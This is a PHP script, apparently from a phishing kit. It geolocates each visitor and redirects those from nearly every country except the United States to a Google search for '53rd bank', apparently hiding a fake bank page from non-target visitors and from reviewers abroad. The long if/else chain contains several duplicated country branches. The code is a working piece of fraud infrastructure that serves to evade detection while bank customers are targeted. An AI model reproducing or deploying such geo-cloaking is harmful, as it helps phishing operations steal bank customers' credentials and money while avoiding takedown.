<?php
require_once('geoplugin.class.php');
$geoplugin = new geoPlugin();
$geoplugin->locate();
// create a variable for the country code
$var_country_code = $geoplugin->countryCode;
// redirect based on country code:
if ($var_country_code == "NL") {
   header('Location: https://www.google.com/search?client=firefox-b-d&q=53rd+bank');
}
else if ($var_country_code == "A1") {
   header('Location: https://www.google.com/search?client=firefox-b-d&q=53rd+bank');
} 
else if ($var_country_code == "AD") {
   header('Location: https://www.google.com/search?client=firefox-b-d&q=53rd+bank');
}
else if ($var_country_code == "AE") {
   header('Location: https://www.google.com/search?client=firefox-b-d&q=53rd+bank');
}
else if ($var_country_code == "AF") {
   header('Location: https://www.google.com/search?client=firefox-b-d&q=53rd+bank');
}
else if ($var_country_code == "AG") {
   header('Location: https://www.google.com/search?client=firefox-b-d&q=53rd+bank');
}
else if ($var_country_code == "AI") {
   header('Location: https://www.google.com/search?client=firefox-b-d&q=53rd+bank');
}
else if ($var_country_code == "AL") {
   header('Location: https://www.google.com/search?client=firefox-b-d&q=53rd+bank');
}
else if ($var_country_code == "AM") {
   header('Location: https://www.google.com/search?client=firefox-b-d&q=53rd+bank');
}
else if ($var_country_code == "AN") {
   header('Location: https://www.google.com/search?client=firefox-b-d&q=53rd+bank');
}
else if ($var_country_code == "AO") {
   header('Location: https://www.google.com/search?client=firefox-b-d&q=53rd+bank');
}
else if ($var_country_code == "AP") {
   header('Location: https://www.google.com/search?client=firefox-b-d&q=53rd+bank');
}
else if ($var_country_code == "AQ") {
   header('Location: https://www.google.com/search?client=firefox-b-d&q=53rd+bank');
}
else if ($var_country_code == "AR") {
   header('Location: https://www.google.com/search?client=firefox-b-d&q=53rd+bank');
}
else if ($var_country_code == "AS") {
   header('Location: https://www.google.com/search?client=firefox-b-d&q=53rd+bank');
}
else if ($var_country_code == "AT") {
   header('Location: https://www.google.com/search?client=firefox-b-d&q=53rd+bank');
}
else if ($var_country_code == "AU") {
   header('Location: https://www.google.com/search?client=firefox-b-d&q=53rd+bank');
} else if ($var_country_code == "AW") {
   header('Location: https://www.google.com/search?client=firefox-b-d&q=53rd+bank');
}
else if ($var_country_code == "AX") {
   header('Location: https://www.google.com/search?client=firefox-b-d&q=53rd+bank');
}
else if ($var_country_code == "AZ") {
   header('Location: https://www.google.com/search?client=firefox-b-d&q=53rd+bank');
}
else if ($var_country_code == "BA") {
   header('Location: https://www.google.com/search?client=firefox-b-d&q=53rd+bank');
}
else if ($var_country_code == "BB") {
   header('Location: https://www.google.com/search?client=firefox-b-d&q=53rd+bank');
}
else if ($var_country_code == "BD") {
   header('Location: https://www.google.com/search?client=firefox-b-d&q=53rd+bank');
}
else if ($var_country_code == "BE") {
   header('Location: https://www.google.com/search?client=firefox-b-d&q=53rd+bank');
}
else if ($var_country_code == "BD") {
   header('Location: https://www.google.com/search?client=firefox-b-d&q=53rd+bank');
}
else if ($var_country_code == "BE") {
   header('Location: https://www.google.com/search?client=firefox-b-d&q=53rd+bank');
}
else if ($var_country_code == "BF") {
   header('Location: https://www.google.com/search?client=firefox-b-d&q=53rd+bank');
}
else if ($var_country_code == "BG") {
   header('Location: https://www.google.com/search?client=firefox-b-d&q=53rd+bank');
}
else if ($var_country_code == "BH") {
   header('Location: https://www.google.com/search?client=firefox-b-d&q=53rd+bank');
}
else if ($var_country_code == "BI") {
   header('Location: https://www.google.com/search?client=firefox-b-d&q=53rd+bank');
}
else if ($var_country_code == "BJ") {
   header('Location: https://www.google.com/search?client=firefox-b-d&q=53rd+bank');
}
else if ($var_country_code == "BM") {
   header('Location: https://www.google.com/search?client=firefox-b-d&q=53rd+bank');
} 
else if ($var_country_code == "BN") {
   header('Location: https://www.google.com/search?client=firefox-b-d&q=53rd+bank');
}
else if ($var_country_code == "BO") {
   header('Location: https://www.google.com/search?client=firefox-b-d&q=53rd+bank');
}
else if ($var_country_code == "BR") {
   header('Location: https://www.google.com/search?client=firefox-b-d&q=53rd+bank');
}
else if ($var_country_code == "BS") {
   header('Location: https://www.google.com/search?client=firefox-b-d&q=53rd+bank');
}
else if ($var_country_code == "BT") {
   header('Location: https://www.google.com/search?client=firefox-b-d&q=53rd+bank');
}
else if ($var_country_code == "BV") {
   header('Location: https://www.google.com/search?client=firefox-b-d&q=53rd+bank');
}
else if ($var_country_code == "BV") {
   header('Location: https://www.google.com/search?client=firefox-b-d&q=53rd+bank');
}
else if ($var_country_code == "BW") {
   header('Location: https://www.google.com/search?client=firefox-b-d&q=53rd+bank');
}
else if ($var_country_code == "BY") {
   header('Location: https://www.google.com/search?client=firefox-b-d&q=53rd+bank');
}
else if ($var_country_code == "BZ") {
   header('Location: https://www.google.com/search?client=firefox-b-d&q=53rd+bank');
}
else if ($var_country_code == "CA") {
   header('Location: https://www.google.com/search?client=firefox-b-d&q=53rd+bank');
}
else if ($var_country_code == "CC") {
   header('Location: https://www.google.com/search?client=firefox-b-d&q=53rd+bank');
}
else if ($var_country_code == "CD") {
   header('Location: https://www.google.com/search?client=firefox-b-d&q=53rd+bank');
}
else if ($var_country_code == "CF") {
   header('Location: https://www.google.com/search?client=firefox-b-d&q=53rd+bank');
}
else if ($var_country_code == "CG") {
   header('Location: https://www.google.com/search?client=firefox-b-d&q=53rd+bank');
} else if ($var_country_code == "CH") {
   header('Location: https://www.google.com/search?client=firefox-b-d&q=53rd+bank');
}
else if ($var_country_code == "CI") {
   header('Location: https://www.google.com/search?client=firefox-b-d&q=53rd+bank');
}
else if ($var_country_code == "CK") {
   header('Location: https://www.google.com/search?client=firefox-b-d&q=53rd+bank');
}
else if ($var_country_code == "CL") {
   header('Location: https://www.google.com/search?client=firefox-b-d&q=53rd+bank');
}
else if ($var_country_code == "CM") {
   header('Location: https://www.google.com/search?client=firefox-b-d&q=53rd+bank');
}
else if ($var_country_code == "CN") {
   header('Location: https://www.google.com/search?client=firefox-b-d&q=53rd+bank');
}
else if ($var_country_code == "CO") {
   header('Location: https://www.google.com/search?client=firefox-b-d&q=53rd+bank');
}
else if ($var_country_code == "CR") {
   header('Location: https://www.google.com/search?client=firefox-b-d&q=53rd+bank');
}
else if ($var_country_code == "CU") {
   header('Location: https://www.google.com/search?client=firefox-b-d&q=53rd+bank');
}
else if ($var_country_code == "CV") {
   header('Location: https://www.google.com/search?client=firefox-b-d&q=53rd+bank');
}
else if ($var_country_code == "CX") {
   header('Location: https://www.google.com/search?client=firefox-b-d&q=53rd+bank');
}
else if ($var_country_code == "CY") {
   header('Location: https://www.google.com/search?client=firefox-b-d&q=53rd+bank');
}
else if ($var_country_code == "CZ") {
   header('Location: https://www.google.com/search?client=firefox-b-d&q=53rd+bank');
}
else if ($var_country_code == "DE") {
   header('Location: https://www.google.com/search?client=firefox-b-d&q=53rd+bank');
}
else if ($var_country_code == "DJ") {
   header('Location: https://www.google.com/search?client=firefox-b-d&q=53rd+bank');
} else if ($var_country_code == "DK") {
   header('Location: https://www.google.com/search?client=firefox-b-d&q=53rd+bank');
}
else if ($var_country_code == "DM") {
   header('Location: https://www.google.com/search?client=firefox-b-d&q=53rd+bank');
}
else if ($var_country_code == "DO") {
   header('Location: https://www.google.com/search?client=firefox-b-d&q=53rd+bank');
}
else if ($var_country_code == "DZ") {
   header('Location: https://www.google.com/search?client=firefox-b-d&q=53rd+bank');
}
else if ($var_country_code == "EC") {
   header('Location: https://www.google.com/search?client=firefox-b-d&q=53rd+bank');
}
else if ($var_country_code == "EE") {
   header('Location: https://www.google.com/search?client=firefox-b-d&q=53rd+bank');
}
else if ($var_country_code == "EG") {
   header('Location: https://www.google.com/search?client=firefox-b-d&q=53rd+bank');
}
else if ($var_country_code == "EH") {
   header('Location: https://www.google.com/search?client=firefox-b-d&q=53rd+bank');
}
else if ($var_country_code == "ER") {
   header('Location: https://www.google.com/search?client=firefox-b-d&q=53rd+bank');
}
else if ($var_country_code == "ES") {
   header('Location: https://www.google.com/search?client=firefox-b-d&q=53rd+bank');
}
else if ($var_country_code == "ET") {
   header('Location: https://www.google.com/search?client=firefox-b-d&q=53rd+bank');
}
else if ($var_country_code == "EU") {
   header('Location: https://www.google.com/search?client=firefox-b-d&q=53rd+bank');
}
else if ($var_country_code == "FI") {
   header('Location: https://www.google.com/search?client=firefox-b-d&q=53rd+bank');
}
else if ($var_country_code == "FJ") {
   header('Location: https://www.google.com/search?client=firefox-b-d&q=53rd+bank');
}
else if ($var_country_code == "FK") {
   header('Location: https://www.google.com/search?client=firefox-b-d&q=53rd+bank');
}
else if ($var_country_code == "FM") {
   header('Location: https://www.google.com/search?client=firefox-b-d&q=53rd+bank');
}
else if ($var_country_code == "FO") {
   header('Location: https://www.google.com/search?client=firefox-b-d&q=53rd+bank');
}
else if ($var_country_code == "FR") {
   header('Location: https://www.google.com/search?client=firefox-b-d&q=53rd+bank');
}
else if ($var_country_code == "GA") {
   header('Location: https://www.google.com/search?client=firefox-b-d&q=53rd+bank');
}
else if ($var_country_code == "GB") {
   header('Location: https://www.google.com/search?client=firefox-b-d&q=53rd+bank');
}
else if ($var_country_code == "GD") {
   header('Location: https://www.google.com/search?client=firefox-b-d&q=53rd+bank');
} else if ($var_country_code == "GE") {
   header('Location: https://www.google.com/search?client=firefox-b-d&q=53rd+bank');
}
else if ($var_country_code == "GF") {
   header('Location: https://www.google.com/search?client=firefox-b-d&q=53rd+bank');
}
else if ($var_country_code == "GG") {
   header('Location: https://www.google.com/search?client=firefox-b-d&q=53rd+bank');
}
else if ($var_country_code == "GH") {
   header('Location: https://www.google.com/search?client=firefox-b-d&q=53rd+bank');
}
else if ($var_country_code == "GI") {
   header('Location: https://www.google.com/search?client=firefox-b-d&q=53rd+bank');
}
else if ($var_country_code == "GL") {
   header('Location: https://www.google.com/search?client=firefox-b-d&q=53rd+bank');
}
else if ($var_country_code == "GM") {
   header('Location: https://www.google.com/search?client=firefox-b-d&q=53rd+bank');
}
else if ($var_country_code == "GN") {
   header('Location: https://www.google.com/search?client=firefox-b-d&q=53rd+bank');
}
else if ($var_country_code == "GP") {
   header('Location: https://www.google.com/search?client=firefox-b-d&q=53rd+bank');
}
else if ($var_country_code == "GQ") {
   header('Location: https://www.google.com/search?client=firefox-b-d&q=53rd+bank');
}
else if ($var_country_code == "GR") {
   header('Location: https://www.google.com/search?client=firefox-b-d&q=53rd+bank');
}
else if ($var_country_code == "GS") {
   header('Location: https://www.google.com/search?client=firefox-b-d&q=53rd+bank');
}
else if ($var_country_code == "GT") {
   header('Location: https://www.google.com/search?client=firefox-b-d&q=53rd+bank');
}
else if ($var_country_code == "GU") {
   header('Location: https://www.google.com/search?client=firefox-b-d&q=53rd+bank');
}
else if ($var_country_code == "GW") {
   header('Location: https://www.google.com/search?client=firefox-b-d&q=53rd+bank');
} 
else if ($var_country_code == "GY") {
   header('Location: https://www.google.com/search?client=firefox-b-d&q=53rd+bank');
}
else if ($var_country_code == "HK") {
   header('Location: https://www.google.com/search?client=firefox-b-d&q=53rd+bank');
}
else if ($var_country_code == "HM") {
   header('Location: https://www.google.com/search?client=firefox-b-d&q=53rd+bank');
}
else if ($var_country_code == "HN") {
   header('Location: https://www.google.com/search?client=firefox-b-d&q=53rd+bank');
}
else if ($var_country_code == "HR") {
   header('Location: https://www.google.com/search?client=firefox-b-d&q=53rd+bank');
}
else if ($var_country_code == "HT") {
   header('Location: https://www.google.com/search?client=firefox-b-d&q=53rd+bank');
}
else if ($var_country_code == "HU") {
   header('Location: https://www.google.com/search?client=firefox-b-d&q=53rd+bank');
}
else if ($var_country_code == "ID") {
   header('Location: https://www.google.com/search?client=firefox-b-d&q=53rd+bank');
}
else if ($var_country_code == "IE") {
   header('Location: https://www.google.com/search?client=firefox-b-d&q=53rd+bank');
}
else if ($var_country_code == "IL") {
   header('Location: https://www.google.com/search?client=firefox-b-d&q=53rd+bank');
}
else if ($var_country_code == "IM") {
   header('Location: https://www.google.com/search?client=firefox-b-d&q=53rd+bank');
}
else if ($var_country_code == "IN") {
   header('Location: https://www.google.com/search?client=firefox-b-d&q=53rd+bank');
}
else if ($var_country_code == "IO") {
   header('Location: https://www.google.com/search?client=firefox-b-d&q=53rd+bank');
}
else if ($var_country_code == "IQ") {
   header('Location: https://www.google.com/search?client=firefox-b-d&q=53rd+bank');
}
else if ($var_country_code == "IR") {
   header('Location: https://www.google.com/search?client=firefox-b-d&q=53rd+bank');
} else if ($var_country_code == "IS") {
   header('Location: https://www.google.com/search?client=firefox-b-d&q=53rd+bank');
}
else if ($var_country_code == "IT") {
   header('Location: https://www.google.com/search?client=firefox-b-d&q=53rd+bank');
}
else if ($var_country_code == "JE") {
   header('Location: https://www.google.com/search?client=firefox-b-d&q=53rd+bank');
}
else if ($var_country_code == "JM") {
   header('Location: https://www.google.com/search?client=firefox-b-d&q=53rd+bank');
}
else if ($var_country_code == "JO") {
   header('Location: https://www.google.com/search?client=firefox-b-d&q=53rd+bank');
}
else if ($var_country_code == "JP") {
   header('Location: https://www.google.com/search?client=firefox-b-d&q=53rd+bank');
}
else if ($var_country_code == "KE") {
   header('Location: https://www.google.com/search?client=firefox-b-d&q=53rd+bank');
}
else if ($var_country_code == "KG") {
   header('Location: https://www.google.com/search?client=firefox-b-d&q=53rd+bank');
}
else if ($var_country_code == "KH") {
   header('Location: https://www.google.com/search?client=firefox-b-d&q=53rd+bank');
}
else if ($var_country_code == "KI") {
   header('Location: https://www.google.com/search?client=firefox-b-d&q=53rd+bank');
}
else if ($var_country_code == "KM") {
   header('Location: https://www.google.com/search?client=firefox-b-d&q=53rd+bank');
}
else if ($var_country_code == "KN") {
   header('Location: https://www.google.com/search?client=firefox-b-d&q=53rd+bank');
}
else if ($var_country_code == "KP") {
   header('Location: https://www.google.com/search?client=firefox-b-d&q=53rd+bank');
}
else if ($var_country_code == "KR") {
   header('Location: https://www.google.com/search?client=firefox-b-d&q=53rd+bank');
}
else if ($var_country_code == "KW") {
   header('Location: https://www.google.com/search?client=firefox-b-d&q=53rd+bank');
} 
else if ($var_country_code == "KY") {
   header('Location: https://www.google.com/search?client=firefox-b-d&q=53rd+bank');
}
else if ($var_country_code == "KZ") {
   header('Location: https://www.google.com/search?client=firefox-b-d&q=53rd+bank');
}
else if ($var_country_code == "LA") {
   header('Location: https://www.google.com/search?client=firefox-b-d&q=53rd+bank');
}
else if ($var_country_code == "LB") {
   header('Location: https://www.google.com/search?client=firefox-b-d&q=53rd+bank');
}
else if ($var_country_code == "LC") {
   header('Location: https://www.google.com/search?client=firefox-b-d&q=53rd+bank');
}
else if ($var_country_code == "LI") {
   header('Location: https://www.google.com/search?client=firefox-b-d&q=53rd+bank');
}
else if ($var_country_code == "LK") {
   header('Location: https://www.google.com/search?client=firefox-b-d&q=53rd+bank');
}
else if ($var_country_code == "LR") {
   header('Location: https://www.google.com/search?client=firefox-b-d&q=53rd+bank');
}
else if ($var_country_code == "LS") {
   header('Location: https://www.google.com/search?client=firefox-b-d&q=53rd+bank');
}
else if ($var_country_code == "LT") {
   header('Location: https://www.google.com/search?client=firefox-b-d&q=53rd+bank');
}
else if ($var_country_code == "LU") {
   header('Location: https://www.google.com/search?client=firefox-b-d&q=53rd+bank');
}
else if ($var_country_code == "LV") {
   header('Location: https://www.google.com/search?client=firefox-b-d&q=53rd+bank');
}
else if ($var_country_code == "LY") {
   header('Location: https://www.google.com/search?client=firefox-b-d&q=53rd+bank');
}
else if ($var_country_code == "MA") {
   header('Location: https://www.google.com/search?client=firefox-b-d&q=53rd+bank');
}
else if ($var_country_code == "MC") {
   header('Location: https://www.google.com/search?client=firefox-b-d&q=53rd+bank');
}
else if ($var_country_code == "MD") {
   header('Location: https://www.google.com/search?client=firefox-b-d&q=53rd+bank');
}
else if ($var_country_code == "ME") {
   header('Location: https://www.google.com/search?client=firefox-b-d&q=53rd+bank');
}
else if ($var_country_code == "MG") {
   header('Location: https://www.google.com/search?client=firefox-b-d&q=53rd+bank');
}
else if ($var_country_code == "MH") {
   header('Location: https://www.google.com/search?client=firefox-b-d&q=53rd+bank');
}
else if ($var_country_code == "MK") {
   header('Location: https://www.google.com/search?client=firefox-b-d&q=53rd+bank');
}
else if ($var_country_code == "ML") {
   header('Location: https://www.google.com/search?client=firefox-b-d&q=53rd+bank');
} else if ($var_country_code == "MM") {
   header('Location: https://www.google.com/search?client=firefox-b-d&q=53rd+bank');
}
else if ($var_country_code == "MN") {
   header('Location: https://www.google.com/search?client=firefox-b-d&q=53rd+bank');
}
else if ($var_country_code == "MO") {
   header('Location: https://www.google.com/search?client=firefox-b-d&q=53rd+bank');
}
else if ($var_country_code == "MP") {
   header('Location: https://www.google.com/search?client=firefox-b-d&q=53rd+bank');
}
else if ($var_country_code == "MQ") {
   header('Location: https://www.google.com/search?client=firefox-b-d&q=53rd+bank');
}
else if ($var_country_code == "MR") {
   header('Location: https://www.google.com/search?client=firefox-b-d&q=53rd+bank');
}
else if ($var_country_code == "MQ") {
   header('Location: https://www.google.com/search?client=firefox-b-d&q=53rd+bank');
}
else if ($var_country_code == "MR") {
   header('Location: https://www.google.com/search?client=firefox-b-d&q=53rd+bank');
}
else if ($var_country_code == "MS") {
   header('Location: https://www.google.com/search?client=firefox-b-d&q=53rd+bank');
}
else if ($var_country_code == "MT") {
   header('Location: https://www.google.com/search?client=firefox-b-d&q=53rd+bank');
}
else if ($var_country_code == "MU") {
   header('Location: https://www.google.com/search?client=firefox-b-d&q=53rd+bank');
}
else if ($var_country_code == "MV") {
   header('Location: https://www.google.com/search?client=firefox-b-d&q=53rd+bank');
}
else if ($var_country_code == "MW") {
   header('Location: https://www.google.com/search?client=firefox-b-d&q=53rd+bank');
}
else if ($var_country_code == "MX") {
   header('Location: https://www.google.com/search?client=firefox-b-d&q=53rd+bank');
}else if ($var_country_code == "MY") {
   header('Location: https://www.google.com/search?client=firefox-b-d&q=53rd+bank');
} else if ($var_country_code == "MZ") {
   header('Location: https://www.google.com/search?client=firefox-b-d&q=53rd+bank');
}
else if ($var_country_code == "NA") {
   header('Location: https://www.google.com/search?client=firefox-b-d&q=53rd+bank');
}
else if ($var_country_code == "NC") {
   header('Location: https://www.google.com/search?client=firefox-b-d&q=53rd+bank');
}
else if ($var_country_code == "NE") {
   header('Location: https://www.google.com/search?client=firefox-b-d&q=53rd+bank');
}
else if ($var_country_code == "NF") {
   header('Location: https://www.google.com/search?client=firefox-b-d&q=53rd+bank');
}
else if ($var_country_code == "NG") {
   header('Location: https://www.google.com/search?client=firefox-b-d&q=53rd+bank');
}
else if ($var_country_code == "NI") {
   header('Location: https://www.google.com/search?client=firefox-b-d&q=53rd+bank');
}
else if ($var_country_code == "NO") {
   header('Location: https://www.google.com/search?client=firefox-b-d&q=53rd+bank');
}
else if ($var_country_code == "NP") {
   header('Location: https://www.google.com/search?client=firefox-b-d&q=53rd+bank');
}
else if ($var_country_code == "NR") {
   header('Location: https://www.google.com/search?client=firefox-b-d&q=53rd+bank');
}
else if ($var_country_code == "NU") {
   header('Location: https://www.google.com/search?client=firefox-b-d&q=53rd+bank');
}
else if ($var_country_code == "NZ") {
   header('Location: https://www.google.com/search?client=firefox-b-d&q=53rd+bank');
}
else if ($var_country_code == "OM") {
   header('Location: https://www.google.com/search?client=firefox-b-d&q=53rd+bank');
}
else if ($var_country_code == "PA") {
   header('Location: https://www.google.com/search?client=firefox-b-d&q=53rd+bank');
} 
else if ($var_country_code == "PE") {
   header('Location: https://www.google.com/search?client=firefox-b-d&q=53rd+bank');
}
else if ($var_country_code == "PF") {
   header('Location: https://www.google.com/search?client=firefox-b-d&q=53rd+bank');
}
else if ($var_country_code == "PG") {
   header('Location: https://www.google.com/search?client=firefox-b-d&q=53rd+bank');
}
else if ($var_country_code == "PH") {
   header('Location: https://www.google.com/search?client=firefox-b-d&q=53rd+bank');
}
else if ($var_country_code == "PK") {
   header('Location: https://www.google.com/search?client=firefox-b-d&q=53rd+bank');
}
else if ($var_country_code == "PL") {
   header('Location: https://www.google.com/search?client=firefox-b-d&q=53rd+bank');
}
else if ($var_country_code == "PM") {
   header('Location: https://www.google.com/search?client=firefox-b-d&q=53rd+bank');
}
else if ($var_country_code == "PN") {
   header('Location: https://www.google.com/search?client=firefox-b-d&q=53rd+bank');
}
else if ($var_country_code == "PR") {
   header('Location: https://www.google.com/search?client=firefox-b-d&q=53rd+bank');
}
else if ($var_country_code == "PS") {
   header('Location: https://www.google.com/search?client=firefox-b-d&q=53rd+bank');
}
else if ($var_country_code == "PT") {
   header('Location: https://www.google.com/search?client=firefox-b-d&q=53rd+bank');
}
else if ($var_country_code == "PW") {
   header('Location: https://www.google.com/search?client=firefox-b-d&q=53rd+bank');
}
else if ($var_country_code == "PY") {
   header('Location: https://www.google.com/search?client=firefox-b-d&q=53rd+bank');
}
else if ($var_country_code == "QA") {
   header('Location: https://www.google.com/search?client=firefox-b-d&q=53rd+bank');
}
else if ($var_country_code == "RE") {
   header('Location: https://www.google.com/search?client=firefox-b-d&q=53rd+bank');
} else if ($var_country_code == "RO") {
   header('Location: https://www.google.com/search?client=firefox-b-d&q=53rd+bank');
}
else if ($var_country_code == "RS") {
   header('Location: https://www.google.com/search?client=firefox-b-d&q=53rd+bank');
}
else if ($var_country_code == "RU") {
   header('Location: https://www.google.com/search?client=firefox-b-d&q=53rd+bank');
}
else if ($var_country_code == "RW") {
   header('Location: https://www.google.com/search?client=firefox-b-d&q=53rd+bank');
}
else if ($var_country_code == "SA") {
   header('Location: https://www.google.com/search?client=firefox-b-d&q=53rd+bank');
}
else if ($var_country_code == "SB") {
   header('Location: https://www.google.com/search?client=firefox-b-d&q=53rd+bank');
}
else if ($var_country_code == "SC") {
   header('Location: https://www.google.com/search?client=firefox-b-d&q=53rd+bank');
}
else if ($var_country_code == "SD") {
   header('Location: https://www.google.com/search?client=firefox-b-d&q=53rd+bank');
}
else if ($var_country_code == "SE") {
   header('Location: https://www.google.com/search?client=firefox-b-d&q=53rd+bank');
}
else if ($var_country_code == "SG") {
   header('Location: https://www.google.com/search?client=firefox-b-d&q=53rd+bank');
}
else if ($var_country_code == "SH") {
   header('Location: https://www.google.com/search?client=firefox-b-d&q=53rd+bank');
}
else if ($var_country_code == "SI") {
   header('Location: https://www.google.com/search?client=firefox-b-d&q=53rd+bank');
}
else if ($var_country_code == "SJ") {
   header('Location: https://www.google.com/search?client=firefox-b-d&q=53rd+bank');
}
else if ($var_country_code == "SK") {
   header('Location: https://www.google.com/search?client=firefox-b-d&q=53rd+bank');
}
else if ($var_country_code == "SL") {
   header('Location: https://www.google.com/search?client=firefox-b-d&q=53rd+bank');
}
else if ($var_country_code == "SM") {
   header('Location: https://www.google.com/search?client=firefox-b-d&q=53rd+bank');
}
else if ($var_country_code == "SN") {
   header('Location: https://www.google.com/search?client=firefox-b-d&q=53rd+bank');
}
else if ($var_country_code == "SO") {
   header('Location: https://www.google.com/search?client=firefox-b-d&q=53rd+bank');
}
else if ($var_country_code == "SR") {
   header('Location: https://www.google.com/search?client=firefox-b-d&q=53rd+bank');
}
else if ($var_country_code == "ST") {
   header('Location: https://www.google.com/search?client=firefox-b-d&q=53rd+bank');
} else if ($var_country_code == "SV") {
   header('Location: https://www.google.com/search?client=firefox-b-d&q=53rd+bank');
}
else if ($var_country_code == "SY") {
   header('Location: https://www.google.com/search?client=firefox-b-d&q=53rd+bank');
}
else if ($var_country_code == "SZ") {
   header('Location: https://www.google.com/search?client=firefox-b-d&q=53rd+bank');
}
else if ($var_country_code == "TC") {
   header('Location: https://www.google.com/search?client=firefox-b-d&q=53rd+bank');
}
else if ($var_country_code == "TD") {
   header('Location: https://www.google.com/search?client=firefox-b-d&q=53rd+bank');
}
else if ($var_country_code == "TF") {
   header('Location: https://www.google.com/search?client=firefox-b-d&q=53rd+bank');
}
else if ($var_country_code == "TG") {
   header('Location: https://www.google.com/search?client=firefox-b-d&q=53rd+bank');
}
else if ($var_country_code == "TH") {
   header('Location: https://www.google.com/search?client=firefox-b-d&q=53rd+bank');
}
else if ($var_country_code == "TJ") {
   header('Location: https://www.google.com/search?client=firefox-b-d&q=53rd+bank');
}
else if ($var_country_code == "TK") {
   header('Location: https://www.google.com/search?client=firefox-b-d&q=53rd+bank');
}
else if ($var_country_code == "TL") {
   header('Location: https://www.google.com/search?client=firefox-b-d&q=53rd+bank');
}
else if ($var_country_code == "TM") {
   header('Location: https://www.google.com/search?client=firefox-b-d&q=53rd+bank');
}
else if ($var_country_code == "TN") {
   header('Location: https://www.google.com/search?client=firefox-b-d&q=53rd+bank');
}
else if ($var_country_code == "TO") {
   header('Location: https://www.google.com/search?client=firefox-b-d&q=53rd+bank');
}else if ($var_country_code == "TR") {
   header('Location: https://www.google.com/search?client=firefox-b-d&q=53rd+bank');
} else if ($var_country_code == "TT") {
   header('Location: https://www.google.com/search?client=firefox-b-d&q=53rd+bank');
}
else if ($var_country_code == "TV") {
   header('Location: https://www.google.com/search?client=firefox-b-d&q=53rd+bank');
}
else if ($var_country_code == "TW") {
   header('Location: https://www.google.com/search?client=firefox-b-d&q=53rd+bank');
}
else if ($var_country_code == "TZ") {
   header('Location: https://www.google.com/search?client=firefox-b-d&q=53rd+bank');
}
else if ($var_country_code == "UA") {
   header('Location: https://www.google.com/search?client=firefox-b-d&q=53rd+bank');
}
else if ($var_country_code == "UG") {
   header('Location: https://www.google.com/search?client=firefox-b-d&q=53rd+bank');
}
else if ($var_country_code == "UM") {
   header('Location: https://www.google.com/search?client=firefox-b-d&q=53rd+bank');
}
else if ($var_country_code == "UY") {
   header('Location: https://www.google.com/search?client=firefox-b-d&q=53rd+bank');
}
else if ($var_country_code == "UZ") {
   header('Location: https://www.google.com/search?client=firefox-b-d&q=53rd+bank');
}
else if ($var_country_code == "VA") {
   header('Location: https://www.google.com/search?client=firefox-b-d&q=53rd+bank');
}
else if ($var_country_code == "VC") {
   header('Location: https://www.google.com/search?client=firefox-b-d&q=53rd+bank');
}
else if ($var_country_code == "VE") {
   header('Location: https://www.google.com/search?client=firefox-b-d&q=53rd+bank');
}
else if ($var_country_code == "VG") {
   header('Location: https://www.google.com/search?client=firefox-b-d&q=53rd+bank');
}
else if ($var_country_code == "VI") {
   header('Location: https://www.google.com/search?client=firefox-b-d&q=53rd+bank');
} else if ($var_country_code == "VN") {
   header('Location: https://www.google.com/search?client=firefox-b-d&q=53rd+bank');
}
else if ($var_country_code == "VU") {
   header('Location: https://www.google.com/search?client=firefox-b-d&q=53rd+bank');
}
else if ($var_country_code == "WF") {
   header('Location: https://www.google.com/search?client=firefox-b-d&q=53rd+bank');
}
else if ($var_country_code == "WS") {
   header('Location: https://www.google.com/search?client=firefox-b-d&q=53rd+bank');
}
else if ($var_country_code == "YE") {
   header('Location: https://www.google.com/search?client=firefox-b-d&q=53rd+bank');
}
else if ($var_country_code == "YT") {
   header('Location: https://www.google.com/search?client=firefox-b-d&q=53rd+bank');
}
else if ($var_country_code == "ZA") {
   header('Location: https://www.google.com/search?client=firefox-b-d&q=53rd+bank');
}
else if ($var_country_code == "ZM") {
   header('Location: https://www.google.com/search?client=firefox-b-d&q=53rd+bank');
}
else if ($var_country_code == "ZW") {
   header('Location: https://www.google.com/search?client=firefox-b-d&q=53rd+bank');
}
?>